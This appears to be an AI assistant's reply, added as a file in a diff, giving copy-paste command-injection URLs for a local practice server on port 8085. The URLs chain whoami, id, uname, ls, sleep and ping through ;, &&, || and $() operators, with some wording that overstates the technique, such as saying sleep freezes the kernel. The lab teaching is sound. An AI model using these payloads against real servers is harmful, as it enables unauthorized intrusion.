@@ -1,0 +1,63 @@
+Now that your local rce_server.js lab is up and running on port 8085, you can use specific Linux system commands to verify that code execution has succeeded.
+When conducting authorized penetration tests or working in labs, security analysts avoid destructive commands. Instead, they look for non-harmful, informational commands that output system metrics or environment settings to verify command injection.
+Here are the complete, ready-to-run true command strings you can copy and paste directly into your lab URLs to test different verification techniques.
+------------------------------
+## 1. In-Band Verification (Direct Output Commands)
+These are standard, lightweight Linux core utilities that print text directly to the screen. If the command runs, the terminal output will show up right in your web browser interface.
+
+* Check Active User Privileges (whoami):
+Prints the username of the account running the web server application.
+
+http://localhost:8085/ping?target=127.0.0.1;whoami
+
+* Print System Information (uname -a):
+Displays the active Linux kernel architecture details of your Ubuntu system machine.
+
+http://localhost:8085/ping?target=127.0.0.1;uname%20-a
+
+* Verify Group Identifiers (id):
+Outputs the UID, GID, and explicit system groups running the active backend thread.
+
+http://localhost:8085/ping?target=127.0.0.1;id
+
+* List Current Directory Contents (ls -la):
+Dumps all files, permissions, and sizes within the folder hosting your Node script.
+
+http://localhost:8085/ping?target=127.0.0.1;ls%20-la
+
+
+------------------------------
+## 2. Out-of-Band (OOB) / Blind Verification Commands
+Sometimes a web application executes your command in the background but suppresses the output, showing only a generic blank screen. This is called Blind Command Injection. You verify execution by forcing the server to talk to an external system or perform a time delay. [1, 2] 
+
+* The Local Network Ping Loopback Backdoor (ping -c 5):
+If the application output is blank, you can tell it to execute a secondary, long-running ping chain. If the browser tab spins and takes exactly 5 seconds to respond, you have confirmed that the command injection is working blindly.
+
+http://localhost:8085/ping?target=127.0.0.1;ping%20-c%205%20127.0.0.1
+
+* The System Time Delay Vector (sleep 4):
+Forces the internal operating system kernel to freeze and pause execution for exactly 4 seconds before sending back the HTTP data headers.
+
+http://localhost:8085/ping?target=127.0.0.1;sleep%204
+
+
+------------------------------
+## 3. Combining Operators and Verification Commands
+To test how your lab handles complex command chains, you can mix your verification commands with the different connection symbols:
+
+| Verification Goal | Syntax Operator Combination | Ready-to-Run Lab URL Testing String |
+|---|---|---|
+| Run independent of ping success | Semicolon ( ; ) | http://localhost:8085/ping?target=127.0.0.1;id |
+| Run only on successful ping | Logical AND ( && ) | http://localhost:8085/ping?target=127.0.0.1%26%26whoami |
+| Run only if initial ping crashes | Logical OR ( || ) | http://localhost:8085/ping?target=broken_ip%7C%7Cuname%20-a |
+| Breakout using subshells | Expression Wrapper ( $() ) | http://localhost:8085/ping?target=127.0.0.1;\$(id) |
+
+## What to Look For in Your Lab Console:
+While testing these links in your browser, switch back to the terminal tab where you launched node rce_server.js. You will see the server output log strings mapping out exactly how your injection payload successfully rewrote the intended system logic strings:
+
+[🚀 SYSTEM WORKING]: Executing command -> ping -c 1 127.0.0.1;id
+
+Would you like to learn how to write a testing block within your Puppeteer tool engine file to automatically fuzz this local port 8085 and listen for these specific system words like uid= or Linux?
+
+[1] [https://blog.geekinstitute.org](https://blog.geekinstitute.org/2025/10/commix-practical-command-injection-guide.html)
+[2] [https://akimbocore.com](https://akimbocore.com/article/finding-command-injection/)
